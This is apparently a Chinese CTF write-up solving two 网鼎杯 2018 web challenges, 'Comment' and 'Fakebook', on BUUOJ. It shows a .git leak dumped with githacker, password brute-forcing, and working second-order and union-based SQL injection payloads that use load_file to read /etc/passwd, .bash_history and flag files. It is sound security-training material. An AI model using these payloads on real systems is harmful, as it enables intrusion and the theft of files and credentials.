## [网鼎杯 2018]Comment
进来是一个留言板，需要登录才能写，要爆破后三位密码。
我们先扫目录：
![](assets/Day%206/file-20251224142401994.png)

发现有很多git文件，这里学习了一下githacker使用
```powershell
  githacker --url http://2b661b6a-7be0-408c-84e4-0aa48b856bee.node4.buuoj.cn:81/ --folder ./result
```
可以下载下来git仓库，还有一份源码：
![](assets/Day%206/file-20251224142342607.png)
```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    break;
case 'comment':
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>

```
我们发现这份源码好像也实现不了网站功能呀，怀疑是不完整源码，又去学习了一下恢复git文件

我们先通过git命令找到历史记录：
```powershell
PS D:\webtool\GitHacker\result\6bc57b1d5399283fce7fbb0c289a505f> git log --reflog
```
然后找到完整源码的文件恢复：
```powershell
PS D:\webtool\GitHacker\result\6bc57b1d5399283fce7fbb0c289a505f> git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
```
![](assets/Day%206/file-20251224142721761.png)
具体怎么判断的哪个是完整的我也不清楚，大概就是看`refs/stash 标记`
然后我们就得到了完整的源代码了：

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```
很明显发现一个`wirte`模式，执行`insert`命令，`comment`模式执行查询，这是一个二次注入的特征。
首先我们尝试爆破一个密码，这里猜测是整数：
![](assets/Day%206/file-20251224161904911.png)
注意到只有pauload为`666`时，响应大小最大且存在302跳转，那这应该就是正确密码了。
下面进行二次注入，这里查询得到的是`category`,然后又被原样写入，所以对该字段注入
输入流程：
1. 在`do=write`页面payload：
```http
title=12&category=12',content=(select(load_file("/etc/passwd"))),/*&content=123
``` 
注意最后的`/*`让后面的`content`字段被注释，这样我们才能控制该字段。
前面`12'`这里引号构造闭合，然后我们就能随意构造`content`字段，注意最外层`()`不能去掉因为这里要拼接到sql语句后要先让他执行我们的查询，不然有语法错误
2. 在`do=comment`页面payload：
```http
content=*/#&bo_id=4
```
这里为了和上面的`/*`一起一起形成注释，把原本的`content`字段注释掉，然后就形成了二次注入
因为把上面我们的输入取出来了，有注入进去，此时就连原本存在的`addslashes()`转义都消失了。
3. 访问`/comment.php?id=4`
查询结果，此时会查到注入的结果，注意每次注入要换一个id，上一步也一样。
![500](assets/Day%206/file-20251224171541840.png)
这里用到了`load_file`是因为常规的注入没有找到flag，所以试试读文件。
注意到web目录：
![](assets/Day%206/file-20251224171722142.png)
是在`/home`下面，看一下web目录的操作记录：
```http
title=12&category=12',content=(select(load_file("/home/www/.bash_history"))),/*&content=123
```
![](assets/Day%206/file-20251224172022201.png)
可以看到当前项由`html.zip`在原本`/tmp`目录下解压再复制到`/var/www`，并且记录了关于项目`html`文件结构的`.DS_Store`在`/tmp`目录中仍存在一份，去读取这个文件了解下项目结构。
![500](assets/Day%206/file-20251224172445156.png)
都是不可见字符，我们想到可以用`hex()`函数读取16进制编码出来
```http
title=12&category=12',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*&content=123
```
得到的16进制转成字符串，可以用在线网站
https://www.sojson.com/hexadecimal.html
![](assets/Day%206/file-20251224173111303.png)
得到了flag的文件路径，`flag_8946e1ff1ee3e40f.php`
```http
title=12&category=12',content=(select(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*&content=123
```
![](assets/Day%206/file-20251224173652831.png)

# [网鼎杯 2018]Fakebook
dirsearch扫一波：
![500](assets/Day%206/file-20251224175237686.png)
有`robots.txt`去看看。
![](assets/Day%206/file-20251224175355330.png)
备份文件，下下来看看：
```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```
看到`curl_exec`那应该就是打ssrf
随便测试、一下，注意到添加blog之后，点击是可以看内容的
![](assets/Day%206/file-20251224180129633.png)我们换成www.baidu.com，访问，确实得到了网页html代码，不过是base64形式：
![](assets/Day%206/file-20251224181442629.png)
这里又想测一下sql注入，测一下，发现居然也存在数字型sql，并且过滤了union select连写，我们试一下注释符，可以绕过
然后直接load_file读文件
```http
?no=0 unioN/**/ select 1,(select(load_file("/var/www/html/flag.php"))),3,4
```